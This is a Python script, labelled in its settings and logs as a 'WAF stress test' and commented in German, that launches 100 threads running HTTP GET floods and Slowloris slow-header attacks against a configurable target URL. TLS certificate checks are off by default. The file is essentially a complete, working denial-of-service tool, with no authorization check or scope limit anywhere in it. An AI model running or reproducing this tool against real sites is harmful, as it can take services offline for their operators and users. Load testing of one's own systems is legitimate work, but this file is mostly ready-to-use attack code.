import socket
import threading
import random
import time
import urllib.parse
import logging
import os
import ssl
from datetime import datetime
from contextlib import suppress

# Konfiguration
TARGET_URL = "http://example.com"
THREAD_COUNT = 100
REQUESTS_PER_THREAD = 100

# Logging
LOG_DIR = os.environ.get("WAF_STRESS_LOG_DIR", "/var/logs")
LOG_BASENAME = "waf_stress_test"

# TLS-Validierung: Default aus (für Tests ohne gültiges Zertifikat).
INSECURE_TLS = os.environ.get("WAF_STRESS_INSECURE_TLS", "1") == "1"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
]

# Richtet die Logausgabe in Datei und Konsole ein.
def _setup_logging():
    os.makedirs(LOG_DIR, exist_ok=True)
    timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
    logfile = os.path.join(LOG_DIR, f"{LOG_BASENAME}_{timestamp}.log")

    logger = logging.getLogger("waf_stress")
    logger.setLevel(logging.INFO)
    logger.handlers.clear()

    fmt = logging.Formatter("%(asctime)sZ\t%(levelname)s\t%(threadName)s\t%(message)s", "%Y-%m-%dT%H:%M:%S")
    fh = logging.FileHandler(logfile, encoding="utf-8")
    fh.setFormatter(fmt)
    sh = logging.StreamHandler()
    sh.setFormatter(fmt)

    logger.addHandler(fh)
    logger.addHandler(sh)
    logger.propagate = False
    logger.info(f"log_file={logfile}")
    return logger

LOGGER = _setup_logging()

# Zerlegt die Ziel-URL in Host, Port, Pfad und Schema.
def parse_url(url: str):
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname
    scheme = parsed.scheme or "http"
    port = parsed.port if parsed.port else (443 if scheme == "https" else 80)
    path = parsed.path if parsed.path else "/"
    return host, port, path, scheme

# Baut die TCP- oder TLS-Verbindung zum Ziel auf (mit SNI bei HTTPS).
def _connect(host: str, port: int, scheme: str) -> socket.socket:
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(4)
    raw.connect((host, port))
    if scheme == "https":
        if INSECURE_TLS:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        else:
            ctx = ssl.create_default_context()
        return ctx.wrap_socket(raw, server_hostname=host)
    return raw

# Liest nur die erste Zeile der HTTP-Antwort, um den Status zu sehen.
def _recv_status_line(sock: socket.socket) -> str:
    with suppress(Exception):
        sock.settimeout(2)
        data = b""
        while b"\r\n" not in data and len(data) < 4096:
            chunk = sock.recv(256)
            if not chunk:
                break
            data += chunk
        line = data.split(b"\r\n", 1)[0]
        return line.decode(errors="replace")
    return ""

# Sendet viele einfache GET-Anfragen in kurzer Zeit.
def http_flood():
    host, port, path, scheme = parse_url(TARGET_URL)
    for i in range(REQUESTS_PER_THREAD):
        s = None
        try:
            s = _connect(host, port, scheme)
            ua = random.choice(USER_AGENTS)
            req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()
            with suppress(OSError):
                s.sendall(req)

            status = _recv_status_line(s)
            if status:
                LOGGER.info(f"http_flood status host={host} port={port} scheme={scheme} i={i} status_line='{status}'")
            else:
                LOGGER.info(f"http_flood sent no_status host={host} port={port} scheme={scheme} i={i}")
            time.sleep(random.uniform(0.1, 0.5))
        except (socket.timeout, OSError, ssl.SSLError) as e:
            LOGGER.warning(f"http_flood exception type={type(e).__name__} host={host} port={port} scheme={scheme} i={i}: {e}")
        finally:
            if s:
                with suppress(OSError):
                    s.close()

# Hält viele Verbindungen mit langsam gesendeten Headern offen.
def slowloris():
    host, port, path, scheme = parse_url(TARGET_URL)
    sockets = []
    for i in range(REQUESTS_PER_THREAD):
        s = None
        try:
            s = _connect(host, port, scheme)
            head = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Connection: keep-alive\r\n"
            ).encode()
            with suppress(OSError):
                s.sendall(head)
            sockets.append(s)
            LOGGER.info(f"slowloris opened host={host} port={port} scheme={scheme} i={i}")
            time.sleep(0.1)
        except (socket.timeout, OSError, ssl.SSLError) as e:
            LOGGER.warning(f"slowloris exception type={type(e).__name__} host={host} port={port} scheme={scheme} i={i}: {e}")
            if s:
                with suppress(Exception):
                    s.close()

    for idx, s in enumerate(sockets):
        with suppress(OSError):
            s.send(b"X-a: b\r\n")
        LOGGER.info(f"slowloris keepalive sent idx={idx} total={len(sockets)}")
        time.sleep(10)

    for idx, s in enumerate(sockets):
        with suppress(Exception):
            s.close()
        LOGGER.info(f"slowloris closed idx={idx}")

# Startet die Threads und wartet auf den Abschluss.
def main():
    LOGGER.info(f"start target={TARGET_URL} threads={THREAD_COUNT} per_thread={REQUESTS_PER_THREAD}")

    threads = []
    for n in range(THREAD_COUNT):
        attack_type = random.choice([http_flood, slowloris])
        t = threading.Thread(target=attack_type, daemon=True, name=f"atk-{n}")
        threads.append(t)
        t.start()
        LOGGER.info(f"thread started name={t.name} type={attack_type.__name__}")

    for t in threads:
        t.join()

    LOGGER.info("done")

if __name__ == "__main__":
    main()
